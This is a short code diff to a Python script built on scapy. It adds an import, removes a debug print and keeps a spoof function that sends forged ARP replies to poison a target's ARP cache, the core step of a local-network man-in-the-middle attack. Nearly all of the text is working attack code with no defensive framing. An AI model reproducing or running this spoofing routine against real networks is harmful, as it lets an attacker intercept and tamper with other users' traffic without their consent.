@@ -3,11 +3,11 @@
 import optparse 
 import time
 import sys
+import scapy.all as scapy
 
-from mac import * 
+from mac import *
 
 def spoof(target_ip, spoof_ip):
-    print(target_ip)
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
     scapy.send(packet, verbose = False)
